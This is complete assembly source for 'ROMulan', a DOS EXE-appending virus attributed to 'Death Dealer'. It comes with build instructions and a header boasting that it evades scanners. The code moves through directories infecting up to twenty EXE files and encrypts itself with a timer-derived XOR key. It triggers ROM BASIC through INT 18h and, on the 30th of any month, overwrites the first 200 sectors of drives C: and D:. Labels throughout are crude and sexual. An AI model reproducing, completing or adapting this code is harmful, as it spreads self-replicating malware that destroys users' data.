;------------------------
;ROMulan By Death Dealer
;666 In Size
;Direct Action EXE Appending Virus
;Jumps Directories
;If Seconds Are Less Then 15 Then User Gets Rom Basic!
;If Day Is 30th Of Any Month, Hard Drives C: To D: Die Instantly!
;Incredible Encryption Is Invisible To All String And Heuristics Scanners!
;It Is Safe To Infect Files On Floppy, However Make Sure It Is Not The 30th!
;Tasm /m
;Tlink /t
;------------------------
;Look For My New Mutation Engine Soon!  No Linking Required!
;That Means Any Fool Can Add It To Their Source!
;Simply By Running A Com File!
;------------------------
;
;

Code    Segment Public 'Code'
        Assume  CS:Code
        Org     100h                           

ID = 'KY'                                      
MaxFiles = 20                                  

Start:

Virus:
        call    realthingbaby                   

RealThingBaby:
        nop
        nop
        nop
        pop     si                              
        sub     si,offset realthingbaby         
        
        call    Cloak_uncloak                   ; Uncloak the virus first

Cloak_Start   equ     $                         ; From here it is cloaked

        mov     bp,si                           

        push    ds                              
        push    es                               
        push    cs
        pop     ds                               
        push    cs
        pop     es                               

        lea     si,[bp+jmpsave2]
        lea     di,[bp+jmpsave]
        movsw                                    
        movsw                                    
        movsw                                    
        movsw                                    

        lea     dx,[bp+offset dta]               
        call    set_DTA                          

        mov     [bp+counter],byte ptr 0          
        mov     ax,3524h                         
        int     21h                              
        mov     word ptr [bp+oldint24],bx        
        mov     word ptr [bp+oldint24+2],es

        mov     ah,25h                           
        lea     dx,[bp+offset int24]             
        int     21h

        push    cs                               
        pop     es                               

        mov     ah,47h                           
        mov     dl,0h                            
        lea     si,[bp+offset currentdir]        
        int     21h

JumpAround:
        lea     dx,[bp+offset exefilespec]       
        call    findfirst

        lea     dx,[bp+offset directory]         
        mov     ah,3bh                            ; Change directory
        int     21h
        jnc     jumparound                       

        call    rom_fuck                          ; Call rom and disk fucker 
      
        
        mov     ax,2524h                         
        lds     dx,[bp+offset oldint24]          
        int     21h

        push    cs
        pop     ds                               

        lea     dx,[bp+offset currentdir]        
        mov     ah,3bh                           
        int     21h

        mov     dx,80h                           
        call    set_dta                          

        pop     es                               
        pop     ds                               

        mov     ax,es
        add     ax,10h
        add     word ptr cs:[bp+jmpsave+2],ax
        add     ax,word ptr cs:[bp+stacksave+2]
        cli                                      
        mov     sp,word ptr cs:[bp+stacksave]
        mov     ss,ax
        sti
        db      0eah                             
jmpsave dd      ?                                
stacksave dd    ?                                
jmpsave2 dd     0fff00000h
stacksave2 dd   ?

FindFirst:
        cmp    [bp+counter],maxfiles             
        ja     quit                              

        mov     ah,4eh                           
        mov     cx,7                             

FindNext:
        int     21h                              
        jc      quit                             

        call    rape                        

        mov     ah,4fh                      
        jmp     findnext                     

Quit:
        ret

Rape:
        mov     ax,3d00h                      
        call    opencunt

        mov     ah,3fh                        
        mov     cx,1ah                        
        lea     dx,[bp+offset buffer]         
        int     21h

        mov     ah,3eh                         
        int     21h

CheckExe:
        cmp     word ptr [bp+buffer+10h],id    
        jz      quitrape                       
        jmp     rapeexe

QuitRape:
        ret

RapeExe:
        les     ax,dword ptr [bp+buffer+14h]   
        mov     word ptr [bp+jmpsave2],ax      
        mov     word ptr [bp+jmpsave2+2],es

        les     ax,dword ptr [bp+buffer+0eh]   
        mov     word ptr [bp+stacksave2],es     
        mov     word ptr [bp+stacksave2+2],ax

        mov     ax, word ptr [bp+buffer+8]      
        mov     cl,4
        shl     ax,cl
        xchg    ax,bx
        les     ax,[bp+offset DTA+26]           
        mov     dx,es                           
        push    ax                              
        push    dx

        sub     ax,bx                            
        sbb     dx,0                             
        mov     cx,10h                           
        div     cx

        mov     word ptr [bp+buffer+14h],dx      
        mov     word ptr [bp+buffer+16h],ax     

        mov     word ptr [bp+buffer+0eh],ax     
        mov     word ptr [bp+buffer+10h],id     
        pop     dx                              
        pop     ax

        add     ax,eof-virus                    
        adc     dx,0                            

        mov     cl,9                            
        push    ax
        shr     ax,cl
        ror     dx,cl
        stc
        adc     dx,ax
        pop     ax
        and     ah,1

        mov     word ptr [bp+buffer+4],dx        
        mov     word ptr [bp+buffer+2],ax

        push    cs                               
        pop     es

        mov     cx,1ah                           

FinishRape:
        push    cx                               
        xor     cx,cx                            
        call    attributes

        mov     al,2                             
        call    opencunt

        mov     ah,40h                           
        lea     dx,[bp+buffer]                   
        pop     cx                               
        int     21h
        jc      closecunt

        mov     al,02                            
        Call    move_fp

Get_Time:
        mov     ah,2ch                           
        int     21h
        cmp     dh,0                             
        je      get_time
        mov     [bp+enc_value],dh                

        call    cloak_rape                    

        inc     [bp+counter]                  

CloseCunt:
        mov     ax,5701h                      
        mov     cx,word ptr [bp+dta+16h]      
        mov     dx,word ptr [bp+dta+18h]      
        int     21h

        mov     ah,3eh                        
        int     21h

        xor     cx,cx
        mov     cl,byte ptr [bp+dta+15h]       
        call    attributes

        retn

Rom_Fuck:               ;The rom routine
        int     21
        
        mov     ah,2ch                         
        int     21h

        cmp     dh,15       ;Are the seconds less then 15?                     
        ja      phase_two   ;If not go to Nuke_disk

        int     18h         ;If so then user looses ROM BASIC! 
                            ;Thus the name ROMulan
Phase_Two:
        call    nuke_disk

Nuke_Disk:        
        mov     ah,2ah
        int     21h
        
        cmp     dl,30           ;Is it the 30th of any month?
        jne     dont_do_shit    ;if not then continue virus

        mov     al,2         ;The C: Drive
        mov     cx,200       ;200 sectors starting at 0
        cli                  ;no aborting :)
        cwd
        int     026h         ;smash the drive!
        sti
        
        mov     al,3        ;The D: Drive
        mov     cx,200      ;Sectors 0-200
        cli                 ;same
        cwd
        int     026h        ;ditto
        sti

Dont_Do_Shit:
        ret

Move_Fp:
        mov     ah,42h                          
        xor     cx,cx                           
        xor     dx,dx                           
        int     21h
        retn

Set_DTA:
        mov     ah,1ah                          
        int     21h                             
        retn

OpenCunt:
        mov     ah,3dh                          
        lea     dx,[bp+DTA+30]                  
        int     21h
        xchg    ax,bx                           
        ret

Attributes:
        mov     ax,4301h                        
        lea     dx,[bp+DTA+30]                  
        int     21h
        ret

Int24:                                          
        mov     al,3                            
        iret                                    

Virus_name     db 'ROMulan'                     
Virus_man      db 'By Death Dealer Of Tempest'  
Thanx_to       db 'Dedicated to ArIsToTlE For All His Help!'


exefilespec  db  '*.exe',0                      
directory    db '..',0                          

Cloak_Rape:
        lea     si,[bp+offset move_begin]       
        lea     di,[bp+offset workarea]         
        mov     cx,move_end-move_begin          

Move_JumpAround:
        movsb                                   
        loop    move_jumparound
        lea     dx,[bp+offset workarea]
        call    dx                              
        ret

Move_Begin    equ     $                         
        mov     si,bp                           
        push    bx                              
        lea     dx,[bp+offset Cloak_end]
        call    dx                              
        pop     bx                              
        mov     ah,40h                          
        mov     cx,eof-virus                     
        lea     dx,[bp+offset virus]              
        int     21h
        push    bx                                
        lea     dx,[bp+offset cloak_end]
        call    dx                                
        pop     bx                                
        ret
Move_End      equ     $                           

Cloak_End   equ     $                           

Cloak_Uncloak:
        lea     bx,[si+cloak_start]             
        mov     cx,cloak_end-cloak_start      

Cloak_JumpAround:
        mov     ah,cs:[bx]                       
        xor     ah,[si+enc_value]                
        mov     cs:[bx],ah                       
        inc     bx                               
        loop    cloak_jumparound
        ret

Enc_Value     db    00h                          

EOF     equ     $                                

Counter db 0                                     
Workarea db     move_end-move_begin dup (?)      
currentdir db   64 dup (?)                       
DTA     db      42 dup (?)                       
Buffer db 1ah dup (?)                            
OldInt24 dd ?                                    

eov     equ     $                                

code    ends
        end     start


